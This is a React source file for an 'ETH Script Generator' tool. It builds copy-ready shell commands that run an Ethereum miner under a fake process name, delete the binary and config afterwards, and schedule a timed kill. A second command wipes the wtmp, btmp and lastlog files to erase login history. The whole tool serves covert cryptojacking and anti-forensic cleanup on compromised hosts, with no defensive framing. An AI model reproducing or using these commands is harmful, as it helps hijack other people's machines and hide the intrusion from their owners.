import React, { useState } from 'react';
import './App.css';
import '98.css';

const App = () => {
    const [minerFilepath, setMinerFilepath] = useState('')
    const [fakeProcessName, setFakeProcessName] = useState('')
    const [config, setConfig] = useState('')
    const [configFilename, setConfigFilename] = useState('')
    const [killAt, setKillAt] = useState('')
    const [message, setMessage] = useState('')

    const clipboard = navigator.clipboard

    const ethScript = ` echo ${Buffer.from(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`

    const clearLoginHistoryScript = ` sudo sh -c 'echo > /var/log/wtmp && echo > /var/log/btmp && echo > /var/log/lastlog'`

    const handleCopyETHScriptBtnClick = () => {
        clipboard.writeText(ethScript).then(() => {
            setMessage('Copy ETH script successful')
        }).catch((e) => {
            console.error(e)
            setMessage('Failed to copy ETH script')
        }).finally(() => {
            setTimeout(() => {
                setMessage('')
            }, 3000)
        })
    }

    const handleCopyClearLoginHistoryScriptBtnClick = () => {
        clipboard.writeText(clearLoginHistoryScript).then(() => {
            setMessage('Copy clear login history script successful')
        }).catch((e) => {
            console.error(e)
            setMessage('Failed to copy clear login history script')
        }).finally(() => {
            setTimeout(() => {
                setMessage('')
            }, 3000)
        })
    }

    const handleSaveDataToLocalStorageBtnClick = () => {
        const data = {
            minerFilepath,
            fakeProcessName,
            config,
            configFilename,
            killAt,
        }
        localStorage.setItem('data', JSON.stringify(data))
        setMessage('Data saved successfully')
        setTimeout(() => {
            setMessage('')
        }, 3000)
    }

    const handleLoadDataFromLocalStorageBtnClick = () => {
        const dataStr = localStorage.getItem('data')
        if (dataStr == null) {
            setMessage('The data in localStorage is empty')
            setTimeout(() => {
                setMessage('')
            }, 3000)
            return
        }
        const data = JSON.parse(dataStr);
        setMinerFilepath(data.minerFilepath)
        setFakeProcessName(data.fakeProcessName)
        setConfig(data.config)
        setConfigFilename(data.configFilename)
        setKillAt(data.killAt)
        setMessage('Data loaded successfully')
        setTimeout(() => {
            setMessage('')
        }, 3000)
    }

    const handleResetBtnClick = () => {
        setMinerFilepath('')
        setFakeProcessName('')
        setConfig('')
        setConfigFilename('')
        setKillAt('')
        setMessage('')
    }

    return (
        <div
            className="window"
            style={{ width: '600px' }}
        >
            <div className="title-bar">
                <div className="title-bar-text">
                    ETH Script Generator
                </div>
            </div>
            <div className="window-body">
                <div className="field-row-stacked">
                    <label>Miner filepath</label>
                    <input
                        type="text"
                        value={minerFilepath}
                        onChange={e => setMinerFilepath(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Fake process name</label>
                    <input
                        type="text"
                        value={fakeProcessName}
                        onChange={e => setFakeProcessName(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Config</label>
                    <textarea
                        rows={10}
                        value={config}
                        onChange={e => setConfig(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Config filename</label>
                    <input
                        type="text"
                        value={configFilename}
                        onChange={e => setConfigFilename(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Kill at</label>
                    <input
                        type="text"
                        value={killAt}
                        onChange={e => setKillAt(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Rest</label>
                    <button onClick={handleResetBtnClick}>Reset</button>
                </div>
                <div className="field-row-stacked">
                    <label>Save & Load</label>
                    <button onClick={handleSaveDataToLocalStorageBtnClick}>Save data to local storage</button>
                    <button onClick={handleLoadDataFromLocalStorageBtnClick}>Load data from local storage</button>
                </div>
                <div className="field-row-stacked">
                    <label>ETH script</label>
                    <textarea
                        rows={8}
                        disabled
                        value={ethScript}
                    />
                    <button onClick={handleCopyETHScriptBtnClick}>Copy ETH script</button>
                </div>
                <div className="field-row-stacked">
                    <label>Clear login history script</label>
                    <textarea
                      disabled
                      value={clearLoginHistoryScript}
                    />
                    <button onClick={handleCopyClearLoginHistoryScriptBtnClick}>Copy clear login history script</button>
                </div>
                <div>
                    <p>{message}</p>
                </div>
            </div>
        </div>
    );
}

export default App;
